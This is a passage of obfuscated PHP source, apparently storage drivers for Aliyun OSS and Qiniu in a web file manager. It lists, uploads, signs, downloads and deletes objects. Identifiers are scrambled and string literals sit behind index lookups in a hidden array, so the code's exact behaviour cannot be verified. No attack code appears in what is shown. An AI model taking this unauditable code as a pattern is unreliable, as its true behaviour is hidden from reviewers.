$Ú¨Äø„Ò[$…ê ûíÏ[90]]; } } public function has($Ğú€¬, $ñ¢˜¢¹× = false, $æÖ¼©Åä = true) { $„¬§Ú³ˆ =& $_SERVER[Ò°Ì”İ•]; $Ğú€¬ = trim($Ğú€¬, $„¬§Ú³ˆ[8]); $²–¶»Æ = empty($Ğú€¬) && $Ğú€¬ !== $„¬§Ú³ˆ[241] ? $„¬§Ú³ˆ[12] : $Ğú€¬ . $„¬§Ú³ˆ[8]; $ø¯ç’Ìæ = $„¬§Ú³ˆ[12]; $ºñˆé˜ = 500; $é¯ê¹õØ = $¥Ş—ùÛ = 0; while (!0) { check_abort(); $Ú¹ºë…Ç = array($„¬§Ú³ˆ[1470] => $„¬§Ú³ˆ[8], $„¬§Ú³ˆ[1471] => $²–¶»Æ, $„¬§Ú³ˆ[1472] => $ºñˆé˜, $„¬§Ú³ˆ[1473] => $ø¯ç’Ìæ); try { $Ù‹¯°‚ç = $this->client->listObjects($this->bucket, $Ú¹ºë…Ç); } catch (OSS\Core\OssException $Î•æÁœ–) { $this->writeLog(__FUNCTION__ . $„¬§Ú³ˆ[225] . $Î•æÁœ–->getMessage()); break; } $ø¯ç’Ìæ = $Ù‹¯°‚ç->getNextMarker(); $ì˜ì‹›« = $Ù‹¯°‚ç->getObjectList(); $–’‰Èæ = $Ù‹¯°‚ç->getPrefixList(); if ($ñ¢˜¢¹×) { if (count($ì˜ì‹›«) > 1 || count($ì˜ì‹›«) == 1 && $ì˜ì‹›«[0]->getKey() != $²–¶»Æ) { $é¯ê¹õØ += count($ì˜ì‹›«) - 1; } if (!empty($–’‰Èæ)) { $¥Ş—ùÛ += count($–’‰Èæ); } if ($ø¯ç’Ìæ === $„¬§Ú³ˆ[12]) { break; } continue; } if ($æÖ¼©Åä) { if (!empty($ì˜ì‹›«)) { if (count($ì˜ì‹›«) > 1 || $ì˜ì‹›«[0]->getKey() != $²–¶»Æ) { return !0; } } } else { if (!empty($–’‰Èæ)) { return !0; } } if ($ø¯ç’Ìæ === $„¬§Ú³ˆ[12]) { break; } } if ($ñ¢˜¢¹×) { return array($„¬§Ú³ˆ[252] => $é¯ê¹õØ, $„¬§Ú³ˆ[253] => $¥Ş—ùÛ); } return !1; } public function listAll($ï›ì³Í”) { $¦’•¾±Ü =& $_SERVER[Ò°Ì”İ•]; $¶ÁÇ·ä’ = $this->fileList($ï›ì³Í”, $¦’•¾±Ü[12], !0); $µ£¿ÙÅİ = array_to_keyvalue($¶ÁÇ·ä’[$¦’•¾±Ü[97]], $¦’•¾±Ü[32]); foreach ($¶ÁÇ·ä’[$¦’•¾±Ü[96]] as $¦†Ø‰) { if (is_string($¦†Ø‰)) { $µ£¿ÙÅİ[$¦†Ø‰] = array($¦’•¾±Ü[90] => 0); } } return $this->listAllFiles($ï›ì³Í”, $µ£¿ÙÅİ); } public function canRead($ÔÉºëœ„) { $‚ö­ò…© =& $_SERVER[Ò°Ì”İ•]; $‘¼íÜÒû = $this->pathAcl($ÔÉºëœ„); return $‘¼íÜÒû == $‚ö­ò…©[1480] || $‘¼íÜÒû == $‚ö­ò…©[634] ? !0 : !1; } public function canWrite($ãÙ¶‚Ûƒ) { $Ùğ±ªé = $this->pathAcl($ãÙ¶‚Ûƒ); return $Ùğ±ªé == $_SERVER[Ò°Ì”İ•][634] ? !0 : !1; } public function pathAcl($ú·€è·°) { $·—²Â =& $_SERVER[Ò°Ì”İ•]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $İ’´çÂ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ú·€è·°)); } catch (OSS\Core\OssException $¾Áƒ¬Òê) { $this->writeLog(__FUNCTION__ . $·—²Â[225] . $¾Áƒ¬Òê->getMessage()); return !1; } $¯Áå­… = $İ’´çÂ == $·—²Â[37] ? $this->bucketAcl : $İ’´çÂ; if ($¯Áå­… == $·—²Â[1481]) { return $·—²Â[1480]; } if ($¯Áå­… == $·—²Â[1482]) { return $·—²Â[634]; } return $¯Áå­…; } private function chmodPath($ÏÚí£…³, $ïÑ¶Àğö = '') { $ºÕœàı‹ =& $_SERVER[Ò°Ì”İ•]; $Á¾Ùƒ×© = empty($ïÑ¶Àğö) ? $ºÕœàı‹[1482] : $ïÑ¶Àğö; $Ç°½Â¡´ = array($ºÕœàı‹[37], $ºÕœàı‹[242], $ºÕœàı‹[1481], $ºÕœàı‹[1482]); if (!in_array($Á¾Ùƒ×©, $Ç°½Â¡´)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ÏÚí£…³), $Á¾Ùƒ×©); } catch (OSS\Core\OssException $âœÜšª›) { $this->writeLog(__FUNCTION__ . $ºÕœàı‹[225] . $âœÜšª›->getMessage()); return !1; } return !0; } public function getContent($ñ±³Š¦›) { return $this->fileSubstr($ñ±³Š¦›, -1); } public function setContent($‘¸—èª, $ˆòÚÓØ½ = '') { $¤›ë‚ÍÕ =& $_SERVER[Ò°Ì”İ•]; try { $³ü©¹³Õ = $this->trafficLimit($¤›ë‚ÍÕ[1483]); $Š»öïÓª = $this->client->putObject($this->bucket, $this->pathEncode($‘¸—èª), $ˆòÚÓØ½, $³ü©¹³Õ); } catch (OSS\Core\OssException $šĞ‘æï») { $this->writeLog(__FUNCTION__ . $¤›ë‚ÍÕ[225] . $šĞ‘æï»->getMessage()); return !1; } $Ë¤—“®¶ = array($¤›ë‚ÍÕ[1477] => trim($Š»öïÓª[$¤›ë‚ÍÕ[1474]], $¤›ë‚ÍÕ[132]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‘¸—èª))); $this->updateObjMeta($‘¸—èª, $Ë¤—“®¶); return isset($Š»öïÓª[$¤›ë‚ÍÕ[1484]][$¤›ë‚ÍÕ[306]]) ? !0 : !1; } private function updateObjMeta($†ÈöñÅ, $×­îïŸÓ) { $†ÈöñÅ = $this->pathEncode($†ÈöñÅ); try { $”…èÚ¥ı = array(OSS\OssClient::OSS_HEADERS => $×­îïŸÓ); $this->client->copyObject($this->bucket, $†ÈöñÅ, $this->bucket, $†ÈöñÅ, $”…èÚ¥ı); } catch (OSS\Core\OssException $× âÊæº) { $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][225] . $× âÊæº->getMessage()); return !1; } return !0; } public function upload($ßïˆ´™É, $¯´îÌÄæ, $†íÊÃáˆ = false, $Ï¥Ò¢òœ = REPEAT_REPLACE) { $±âÆ«­á =& $_SERVER[Ò°Ì”İ•]; $ÂØ ºğ = trim($ßïˆ´™É, $±âÆ«­á[8]); $©Ö‰‚ÉÙ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($±âÆ«­á[1477] => @md5_file($¯´îÌÄæ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ßïˆ´™É))); $©Ö‰‚ÉÙ = $this->trafficLimit($±âÆ«­á[1483], $©Ö‰‚ÉÙ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ÂØ ºğ), $¯´îÌÄæ, $©Ö‰‚ÉÙ); } catch (OSS\Core\OssException $¸Ğ¹ì±) { $this->writeLog(__FUNCTION__ . $±âÆ«­á[225] . $¸Ğ¹ì±->getMessage()); return !1; } return $this->getPathOuter($ßïˆ´™É); } public function getHost() { $ĞäÈ£È =& $_SERVER[Ò°Ì”İ•]; $í¿¯‘ãä = explode($ĞäÈ£È[221], parent::getHost()); return $í¿¯‘ãä[0] . $ĞäÈ£È[221] . $this->bucket . $ĞäÈ£È[10] . $í¿¯‘ãä[1]; } public function uploadFormData($ÄÈ±©™Ã, $€ÛÁí‰± = 3600) { $•Ï‚œ›Ä =& $_SERVER[Ò°Ì”İ•]; if (!($Ó êğ—Æ = $this->getHost())) { return !1; } $êœÑ™Ñô = $€ÛÁí‰±; $ó·Œ‚ = date($•Ï‚œ›Ä[1485], time() + $êœÑ™Ñô); $±Ê•øÔ¯ = new DateTime($ó·Œ‚); $ä»Ÿ©Ïş = $±Ê•øÔ¯->format(DateTime::ISO8601); $™Æèï„ı = strpos($ä»Ÿ©Ïş, $•Ï‚œ›Ä[383]); $ä»Ÿ©Ïş = substr($ä»Ÿ©Ïş, 0, $™Æèï„ı) . $•Ï‚œ›Ä[1486]; $íã¾³½€ = 1048576000 * 5; $ªóØ¢“É = $this->pathFather($ÄÈ±©™Ã); $ÍºÚŠÈÖ = array($•Ï‚œ›Ä[275] => $ä»Ÿ©Ïş, $•Ï‚œ›Ä[278] => array(array($•Ï‚œ›Ä[1487], 0, $íã¾³½€), array($•Ï‚œ›Ä[280], $•Ï‚œ›Ä[281], $ªóØ¢“É))); $¥ì¯ßú = base64_encode(json_encode($ÍºÚŠÈÖ)); $­¢ş“Á“ = base64_encode(hash_hmac($•Ï‚œ›Ä[1408], $¥ì¯ßú, $this->secret, !0)); $ âü‚Š  = array($•Ï‚œ›Ä[1488] => $this->accessKey, $•Ï‚œ›Ä[290] => $¥ì¯ßú, $•Ï‚œ›Ä[283] => $•Ï‚œ›Ä[274], $•Ï‚œ›Ä[1489] => $­¢ş“Á“, $•Ï‚œ›Ä[219] => $Ó êğ—Æ); $ âü‚Š  = $this->trafficLimit($•Ï‚œ›Ä[1483], $ âü‚Š , !0); return $ âü‚Š ; } public function uploadMultiData($üçŸÒÕ‘, $û£èäÁ = 3600) { $µùÔÙ•Õ =& $_SERVER[Ò°Ì”İ•]; if (!($±ŞàıÅ· = $this->getHost())) { return !1; } $áèŸœªÒ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($üçŸÒÕ‘)); return array($µùÔÙ•Õ[294] => $áèŸœªÒ, $µùÔÙ•Õ[219] => $±ŞàıÅ· . $µùÔÙ•Õ[8] . $this->pathEncode($üçŸÒÕ‘), $µùÔÙ•Õ[295] => gmdate($µùÔÙ•Õ[1490]), $µùÔÙ•Õ[108] => $üçŸÒÕ‘); } public function uploadMultiAuth($úıÛæô, $ôâÅ×ì… = array()) { if (isset($ôâÅ×ì…[$_SERVER[Ò°Ì”İ•][296]])) { return $this->uploadPartAuth($úıÛæô, $ôâÅ×ì…); } return $this->uploadListAuth($úıÛæô, $ôâÅ×ì…); } private function uploadPartAuth($ú½ Ú›Ù, $…¬öÌİœ = array()) { $ÚÖ¶¢æñ =& $_SERVER[Ò°Ì”İ•]; $ƒõë‡Ùì = $…¬öÌİœ[$ÚÖ¶¢æñ[108]]; $€Ú£€÷ø = $this->_getUploadAuth($ƒõë‡Ùì, $…¬öÌİœ); $§Ó£‹ßº = array($ÚÖ¶¢æñ[298] => $€Ú£€÷ø[$ÚÖ¶¢æñ[298]], $ÚÖ¶¢æñ[295] => $€Ú£€÷ø[$ÚÖ¶¢æñ[295]]); if (isset($€Ú£€÷ø[$ÚÖ¶¢æñ[1491]])) { $§Ó£‹ßº[$ÚÖ¶¢æñ[1491]] = $€Ú£€÷ø[$ÚÖ¶¢æñ[1491]]; } return $§Ó£‹ßº; } private function uploadListAuth($ÏÙú¤ùÓ, $Èªøˆ™¹ = array()) { $ÉªÄíú =& $_SERVER[Ò°Ì”İ•]; $´³ØŒàÎ = $Èªøˆ™¹[$ÉªÄíú[108]]; $âÄ¶Ç»Ã = $Èªøˆ™¹[$ÉªÄíú[294]]; $Èêê ³ï = $this->client->listParts($this->bucket, $this->pathEncode($´³ØŒàÎ), $âÄ¶Ç»Ã); $âÌäÎ‚ = $Èêê ³ï->getListPart(); $„Éæ¨Ôä = array(); foreach ($âÌäÎ‚ as $–©Üµ®Ê) { $„Éæ¨Ôä[] = array($ÉªÄíú[309] => $–©Üµ®Ê->getPartNumber(), $ÉªÄíú[310] => trim($–©Üµ®Ê->getETag(), $ÉªÄíú[132])); } if (!$„Éæ¨Ôä) { return !1; } $š§¤‘Ø› = $this->_getUploadAuth($´³ØŒàÎ, $Èªøˆ™¹); return array($ÉªÄíú[298] => $š§¤‘Ø›[$ÉªÄíú[298]], $ÉªÄíú[295] => $š§¤‘Ø›[$ÉªÄíú[295]], $ÉªÄíú[301] => $„Éæ¨Ôä); } private function _getUploadAuth($ğƒäµ—, $¬Î¶Ü…†) { $›ÆŠ§±Î =& $_SERVER[Ò°Ì”İ•]; $‚®Âí‡ª = gmdate($›ÆŠ§±Î[1490]); $éÏÅŒ­ˆ = isset($¬Î¶Ü…†[$›ÆŠ§±Î[296]]) ? $›ÆŠ§±Î[266] : $›ÆŠ§±Î[300]; $ÍÏùÈúÕ = array_intersect_key($¬Î¶Ü…†, array_flip(array($›ÆŠ§±Î[296], $›ÆŠ§±Î[294]))); ksort($ÍÏùÈúÕ); $Š÷Íºî = $ÍÏùÈúÕ ? $›ÆŠ§±Î[87] . http_build_query($ÍÏùÈúÕ, null, $›ÆŠ§±Î[297], PHP_QUERY_RFC3986) : $›ÆŠ§±Î[12]; $Ú§ºÍÒ = array($éÏÅŒ­ˆ, $›ÆŠ§±Î[12], $›ÆŠ§±Î[134], $‚®Âí‡ª, "\170\x2d\x6f\163\x73\x2d\x64\141\x74\x65\72{$‚®Âí‡ª}", $›ÆŠ§±Î[8] . $this->bucket . $›ÆŠ§±Î[8] . $ğƒäµ— . $Š÷Íºî); if (isset($¬Î¶Ü…†[$›ÆŠ§±Î[296]])) { $÷œÆñ¸‹ = $this->trafficLimit($›ÆŠ§±Î[1483], array(), !0); if ($÷œÆñ¸‹) { $ğƒäµ— = $›ÆŠ§±Î[1491]; array_splice($Ú§ºÍÒ, 5, 0, $ğƒäµ— . $›ÆŠ§±Î[4] . $÷œÆñ¸‹[$ğƒäµ—]); } } $À²—ı– = implode($›ÆŠ§±Î[59], $Ú§ºÍÒ); $ªËòúêŞ = base64_encode(hash_hmac($›ÆŠ§±Î[1408], $À²—ı–, $this->secret, !0)); $‡Ş¥»ÊÙ = $›ÆŠ§±Î[1460] . $this->accessKey . $›ÆŠ§±Î[4] . $ªËòúêŞ; $âùêáë¨ = array($›ÆŠ§±Î[298] => $‡Ş¥»ÊÙ, $›ÆŠ§±Î[295] => $‚®Âí‡ª); if (!empty($÷œÆñ¸‹)) { $âùêáë¨ = array_merge($âùêáë¨, $÷œÆñ¸‹); } return $âùêáë¨; } public function download($Ô›×Æûó, $Å÷ó–¹À) { $ç¥Ô•ï =& $_SERVER[Ò°Ì”İ•]; if ($this->isFolder($Ô›×Æûó)) { return !1; } try { $‰öÎåî = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Å÷ó–¹À); $‰öÎåî = $this->trafficLimit($ç¥Ô•ï[123], $‰öÎåî); $this->client->getObject($this->bucket, $this->pathEncode($Ô›×Æûó), $‰öÎåî); } catch (OSS\Core\OssException $ó‘ÅÊÏ) { $this->writeLog(__FUNCTION__ . $ç¥Ô•ï[225] . $ó‘ÅÊÏ->getMessage()); return !1; } return $Å÷ó–¹À; } public function fileSubstr($å´ÒÖæï, $¸êµËêä = 0, $ÕÕ°ëÁÎ = false) { if ($¸êµËêä === -1) { $¶¹î¤Î = array(); } else { if ($ÕÕ°ëÁÎ === !1) { $ôºÏ¶¥  = $this->size($å´ÒÖæï); } else { $ôºÏ¶¥  = $¸êµËêä + $ÕÕ°ëÁÎ - 1; } $¶¹î¤Î = array(OSS\OssClient::OSS_RANGE => "{$¸êµËêä}\x2d{$ôºÏ¶¥ }"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($å´ÒÖæï), $¶¹î¤Î); } catch (OSS\Core\OssException $éÆñ‚±¯) { $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][225] . $éÆñ‚±¯->getMessage()); think_exception($éÆñ‚±¯->getMessage()); return !1; } } private function trafficLimit($À¯ù¼ì, $›»ÔÅ£¾ = array(), $Á¡ ãƒï = false) { $«éµ÷¼Š =& $_SERVER[Ò°Ì”İ•]; if ($À¯ù¼ì == $«éµ÷¼Š[1483] && $this->isUploadServer() || $À¯ù¼ì == $«éµ÷¼Š[123] && $this->isFileOutServer()) { return $›»ÔÅ£¾; } $°àÖıûï = floatval($GLOBALS[$«éµ÷¼Š[6]][$«éµ÷¼Š[103]][$«éµ÷¼Š[121]][$À¯ù¼ì]) * 1024 * 1024 * 8; if (!$°àÖıûï) { return $›»ÔÅ£¾; } $°àÖıûï = $°àÖıûï < 819200 ? 819200 : ($°àÖıûï > 838860800 ? 838860800 : $°àÖıûï); if ($Á¡ ãƒï) { $›»ÔÅ£¾[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($°àÖıûï); } else { if (!isset($›»ÔÅ£¾[OSS\OssClient::OSS_HEADERS])) { $›»ÔÅ£¾[OSS\OssClient::OSS_HEADERS] = array(); } $›»ÔÅ£¾[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($°àÖıûï); } return $›»ÔÅ£¾; } public function link($ÃŠæ¢ˆ, $×ÊîÊı¥ = array()) { $ÇÌøìòĞ =& $_SERVER[Ò°Ì”İ•]; if (!$this->exist($ÃŠæ¢ˆ) || $this->isFolder($ÃŠæ¢ˆ)) { return !1; } try { $×ÊîÊı¥ = $this->trafficLimit($ÇÌøìòĞ[123], $×ÊîÊı¥, !0); $‚íÁœ½ = $this->client->signUrl($this->bucket, $this->pathEncode($ÃŠæ¢ˆ), 3600 * 12, $ÇÌøìòĞ[1492], $×ÊîÊı¥); return $this->getCdnLink($‚íÁœ½); } catch (OSS\Core\OssException $²ë¥Æ‰) { $this->writeLog(__FUNCTION__ . $ÇÌøìòĞ[225] . $²ë¥Æ‰->getMessage()); return !1; } } public function fileOut($ ˆîÎ¤±, $öº—ì¬‹ = false, $”³ï»ôÛ = false, $†¤†şœ = '') { $ıæ•åŞ =& $_SERVER[Ò°Ì”İ•]; if ($this->isFileOutServer()) { return $this->fileOutServer($ ˆîÎ¤±, $öº—ì¬‹, $”³ï»ôÛ, $†¤†şœ); } if (!$”³ï»ôÛ) { $”³ï»ôÛ = $this->pathThis($ ˆîÎ¤±); } $”³ï»ôÛ = rawurlencode($”³ï»ôÛ); $ŒÁ©‰ÖĞ = get_file_mime(get_path_ext($”³ï»ôÛ)); if ($ŒÁ©‰ÖĞ == $ıæ•åŞ[261]) { return parent::fileOut($ ˆîÎ¤±, $öº—ì¬‹, $”³ï»ôÛ, $†¤†şœ); } $öº—ì¬‹ = $öº—ì¬‹ ? $ıæ•åŞ[1493] : $ıæ•åŞ[1494]; $ğø¥™ĞË = array(OSS\OssClient::OSS_SUB_RESOURCE => $ıæ•åŞ[1495] . rawurlencode("{$öº—ì¬‹}\73\x66\x69\154\x65\156\x61\155\x65\75{$”³ï»ôÛ}")); $ğø¥™ĞË[OSS\OssClient::OSS_SUB_RESOURCE] .= $ıæ•åŞ[1496] . rawurlencode($ŒÁ©‰ÖĞ); $ãÌ÷îéÈ = $this->link($ ˆîÎ¤±, $ğø¥™ĞË); $this->fileOutLink($ãÌ÷îéÈ); } public function fileOutServer($ÅŠÜü, $Æ¶ğ¾Üö = false, $½å“µ¾Ü = false, $â¯­¶¯ä = '') { parent::fileOut($ÅŠÜü, $Æ¶ğ¾Üö, $½å“µ¾Ü, $â¯­¶¯ä); } public function fileOutImage($Šõ˜«ıÎ, $’ŒØ•» = 250) { if ($this->size($Šõ˜«ıÎ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Šõ˜«ıÎ, $’ŒØ•»); } $ú•‘âáè = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ò°Ì”İ•][1457] . $’ŒØ•»); $ŒŸ³ÆñÚ = $this->link($Šõ˜«ıÎ, $ú•‘âáè); $this->fileOutLink($ŒŸ³ÆñÚ); } public function fileOutImageServer($“öÆ­´è, $Áäº‹ƒ = 250) { parent::fileOutImage($“öÆ­´è, $Áäº‹ƒ); } public function fileOutLink($ï“Ñ½„) { $úÆã‰‡¨ =& $_SERVER[Ò°Ì”İ•]; if (!$this->isCdnHost() && substr($ï“Ñ½„, 0, 7) == $úÆã‰‡¨[229]) { $ï“Ñ½„ = $úÆã‰‡¨[230] . substr($ï“Ñ½„, 7); } header($úÆã‰‡¨[186] . $ï“Ñ½„); die; } public function hashMd5($úéş‰¶æ, $ùùÛõå˜ = '') { $†—º´ı =& $_SERVER[Ò°Ì”İ•]; $Í•ÑÈ– = $this->_objectMeta($úéş‰¶æ); if (!$Í•ÑÈ–) { return $†—º´ı[12]; } if (!isset($Í•ÑÈ–[$†—º´ı[1477]]) && !empty($ùùÛõå˜)) { $éˆû»Şû = $this->updateObjMeta($úéş‰¶æ, array($†—º´ı[1477] => $ùùÛõå˜)); $Í•ÑÈ–[$†—º´ı[1477]] = $éˆû»Şû ? $ùùÛõå˜ : $†—º´ı[12]; } return isset($Í•ÑÈ–[$†—º´ı[1477]]) ? strtolower($Í•ÑÈ–[$†—º´ı[1477]]) : $†—º´ı[12]; } public function size($›œß‡êÁ) { $¦Âğæ˜µ = $this->objectMeta($›œß‡êÁ); return $¦Âğæ˜µ ? $¦Âğæ˜µ[$_SERVER[Ò°Ì”İ•][90]] : 0; } public function info($ê…™ãß) { if ($this->isFolder($ê…™ãß)) { return $this->folderInfo($ê…™ãß); } else { if ($this->isFile($ê…™ãß)) { return $this->fileInfo($ê…™ãß); } } return !1; } public function exist($²Ïùì­ã) { return $this->isFile($²Ïùì­ã) || $this->isFolder($²Ïùì­ã); } public function isFile($ùµÑÒğ) { return !$this->isFolder($ùµÑÒğ) && $this->objectMeta($ùµÑÒğ); } public function isFolder($×©í÷‰Ô) { return $this->cacheMethod($_SERVER[Ò°Ì”İ•][190], $×©í÷‰Ô); } protected function objectMeta($ó±©¯Æª) { return $this->cacheMethod($_SERVER[Ò°Ì”İ•][192], $ó±©¯Æª); } protected function _objectMeta($«şÜ¶»Å) { $ËÂ¼°ó =& $_SERVER[Ò°Ì”İ•]; try { $¶µàÊó‘ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($«şÜ¶»Å)); } catch (OSS\Core\OssException $Óå÷ÍÕ¤) { $this->writeLog(__FUNCTION__ . $ËÂ¼°ó[225] . $Óå÷ÍÕ¤->getMessage()); $¶µàÊó‘ = !1; } if ($¶µàÊó‘) { $¶µàÊó‘[$ËÂ¼°ó[90]] = intval($¶µàÊó‘[$ËÂ¼°ó[1475]]); } return $¶µàÊó‘; } protected function _isFolder($æ„ñ¸ª¢) { $©Æöƒƒ =& $_SERVER[Ò°Ì”İ•]; if ($æ„ñ¸ª¢ == $©Æöƒƒ[12] || $æ„ñ¸ª¢ == $©Æöƒƒ[8]) { return !0; } $Ãı’Áª» = array($©Æöƒƒ[1470] => $©Æöƒƒ[8], $©Æöƒƒ[1471] => rtrim($æ„ñ¸ª¢, $©Æöƒƒ[8]) . $©Æöƒƒ[8], $©Æöƒƒ[1472] => 1, $©Æöƒƒ[1473] => $©Æöƒƒ[12]); $Éµú­Ë = $this->client->listObjects($this->bucket, $Ãı’Áª»); if ($Éµú­Ë->getObjectList() || $Éµú­Ë->getPrefixList()) { return !0; } return !1; } public function writeLog($éÔç¾ò¾ = '', $‘šßÕ÷Ò = false) { $ÓÙ•Ââ‚ =& $_SERVER[Ò°Ì”İ•]; $éÂËê·¹ = in_array(ACTION, array($ÓÙ•Ââ‚[223], $ÓÙ•Ââ‚[224])); if (!$éÂËê·¹ && !GLOBAL_DEBUG) { return; } $Ó­ãèíí = 0; if (stripos($éÔç¾ò¾, $ÓÙ•Ââ‚[1497]) !== !1) { $Ó­ãèíí = 1; $õ²ÀÎ¨ş = explode($ÓÙ•Ââ‚[1498], $éÔç¾ò¾); $éÔç¾ò¾ = !empty($õ²ÀÎ¨ş[1]) ? $õ²ÀÎ¨ş[1] : $éÔç¾ò¾; } else { if (stripos($éÔç¾ò¾, $ÓÙ•Ââ‚[1499])) { $Ó­ãèíí = 2; $õ²ÀÎ¨ş = explode($ÓÙ•Ââ‚[1499], $éÔç¾ò¾); $õ²ÀÎ¨ş = explode($ÓÙ•Ââ‚[4], $õ²ÀÎ¨ş[0]); $éÔç¾ò¾ = !empty($õ²ÀÎ¨ş[1]) ? $õ²ÀÎ¨ş[1] : $éÔç¾ò¾; } } if ($éÂËê·¹ && I18n::getType() == $ÓÙ•Ââ‚[1500]) { if ($Ó­ãèíí == 1) { $éÔç¾ò¾ = str_replace($ÓÙ•Ââ‚[1501], $ÓÙ•Ââ‚[1502], $éÔç¾ò¾); } else { if ($Ó­ãèíí == 2) { $õ²ÀÎ¨ş = explode($ÓÙ•Ââ‚[225], $õ²ÀÎ¨ş[0]); $¬ ÌŞ = isset($õ²ÀÎ¨ş[1]) ? $õ²ÀÎ¨ş[1] : $ÓÙ•Ââ‚[12]; $¦ìùé²¥ = array($ÓÙ•Ââ‚[1503] => $ÓÙ•Ââ‚[1504], $ÓÙ•Ââ‚[1505] => $ÓÙ•Ââ‚[1506], $ÓÙ•Ââ‚[1507] => $ÓÙ•Ââ‚[1508], $ÓÙ•Ââ‚[1509] => $ÓÙ•Ââ‚[1510], $ÓÙ•Ââ‚[1511] => $ÓÙ•Ââ‚[1512], $ÓÙ•Ââ‚[1513] => $ÓÙ•Ââ‚[1514], $ÓÙ•Ââ‚[1515] => $ÓÙ•Ââ‚[1516], $ÓÙ•Ââ‚[1517] => $ÓÙ•Ââ‚[1518], $ÓÙ•Ââ‚[1519] => $ÓÙ•Ââ‚[1520], $ÓÙ•Ââ‚[1521] => $ÓÙ•Ââ‚[1522]); if (isset($¦ìùé²¥[$¬ ÌŞ])) { $éÔç¾ò¾ = $¦ìùé²¥[$¬ ÌŞ]; } } } if (stripos($éÔç¾ò¾, $ÓÙ•Ââ‚[1523])) { $éÔç¾ò¾ = $ÓÙ•Ââ‚[1524]; } } if (!trim($éÔç¾ò¾)) { return; } parent::writeLog(trim($éÔç¾ò¾), $‘šßÕ÷Ò); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($éÊ×¸ş€) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ò°Ì”İ•][1525]; $this->_init($éÊ×¸ş€); } public function _init($œªÊ™Ó·) { $šŠ…·¹ë =& $_SERVER[Ò°Ì”İ•]; $this->config = $œªÊ™Ó·; foreach ($œªÊ™Ó· as $¢Í¿”œ‚ => $Çí¥°÷¥) { if (isset($this->{$¢Í¿”œ‚})) { $this->{$¢Í¿”œ‚} = $Çí¥°÷¥; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($šŠ…·¹ë[1526] . LNG($šŠ…·¹ë[1461])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($œğÖÈïå, $íı‹û€ = '', $ãøŠâòÂ = REPEAT_RENAME) { if ($this->setContent($œğÖÈïå, $íı‹û€)) { return $this->getPathOuter($œğÖÈïå); } return !1; } public function mkdir($‘À”Å €, $¯çƒïÀì = REPEAT_SKIP) { $ÍŸ’Ä£¤ =& $_SERVER[Ò°Ì”İ•]; $¡ÅÅ á­ = trim($‘À”Å €, $ÍŸ’Ä£¤[8]); if ($this->_isFolder($¡ÅÅ á­)) { return $this->getPathOuter($¡ÅÅ á­); } $‘À”Å € = $¡ÅÅ á­ . $ÍŸ’Ä£¤[8]; $°…ê§°ã = get_path_this($¡ÅÅ á­); $Öñøê‘³ = $‘À”Å € . $°…ê§°ã; if (!$this->mkfile($Öñøê‘³)) { return !1; } if (!$this->moveFile($Öñøê‘³, $‘À”Å €)) { $this->delFile($Öñøê‘³); return !1; } return $this->getPathOuter($¡ÅÅ á­); } public function copyFile($Ò„Õşª, $Ü®¢ØÀĞ) { $Ï¡×„ş™ = $this->bucketManager->copy($this->bucket, $Ò„Õşª, $this->bucket, $Ü®¢ØÀĞ, !0); return $Ï¡×„ş™ ? !1 : $this->getPathOuter($Ü®¢ØÀĞ); } public function moveFile($²€øã•´, $¼÷Èşèë) { $Ôö‰Êªç = $this->bucketManager->move($this->bucket, $²€øã•´, $this->bucket, $¼÷Èşèë, !0); return $Ôö‰Êªç ? !1 : $this->getPathOuter($¼÷Èşèë); } public function delFile($¿÷©€) { if (!$this->exist($¿÷©€)) { return !0; } $°Ì‘ùÒİ = $this->bucketManager->delete($this->bucket, $¿÷©€); if (!$°Ì‘ùÒİ) { return !0; } return $°Ì‘ùÒİ->code() == 612 ? !0 : !1; } public function delFolder($¢á¥Î) { $óìÜœñÃ =& $_SERVER[Ò°Ì”İ•]; if (!$this->exist($¢á¥Î)) { return !0; } $this->listItemCache = !1; $¦Ä¾™Åª = $this->fileList($¢á¥Î); $this->listItemCache = !0; $°¯‰éı = trim($¢á¥Î, $óìÜœñÃ[8]) . $óìÜœñÃ[8]; if (!empty($¢á¥Î) && $¢á¥Î !== $óìÜœñÃ[241] && !in_array($°¯‰éı, $¦Ä¾™Åª[$óìÜœñÃ[96]])) { $¦Ä¾™Åª[$óìÜœñÃ[96]][] = $°¯‰éı; } $ìç‹—á£ = $this->delByBatch($¦Ä¾™Åª[$óìÜœñÃ[97]]); if (!$ìç‹—á£) { return !1; } $ìç‹—á£ = $this->delByBatch($¦Ä¾™Åª[$óìÜœñÃ[96]]); if (!$ìç‹—á£) { return !1; } return $this->delFile($°¯‰éı); } private function delByBatch($‚¢‘×û¼) { foreach (array_chunk($‚¢‘×û¼, 1000) as $ø÷¦¾¬³) { 